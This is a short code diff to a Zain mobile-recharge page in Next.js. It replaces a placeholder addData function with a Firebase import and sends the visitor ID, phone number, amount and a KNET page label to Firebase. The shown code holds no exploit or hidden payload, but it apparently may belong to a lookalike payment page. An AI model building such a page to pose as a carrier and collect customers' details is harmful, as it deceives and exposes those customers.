@@ -7,6 +7,7 @@ import { Input } from "@/components/ui/input"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTrigger } from "./ui/sheet"
 import Link from "next/link"
+import { addData } from "@/lib/firebase"
 
 const rechargeOptions = [
   { amount: "2.000", validity: "الصلاحية 2 يوم", days: 2 },
@@ -19,10 +20,7 @@ const rechargeOptions = [
 ]
 
 // Placeholder for addData function - replace with actual implementation
-async function addData(data: any) {
-  console.log("Data to be sent:", data);
-  // Add your actual API call here
-}
+
 
 export default function ZainRechargePage({
   setShow,
@@ -80,6 +78,7 @@ export default function ZainRechargePage({
       await addData({
         id: visitorId,
         phone: phoneNumber,
+        phoneNumber,
         amount: selectedAmount.amount,
         timestamp: new Date().toISOString(),
         currentPage: "كي نت",
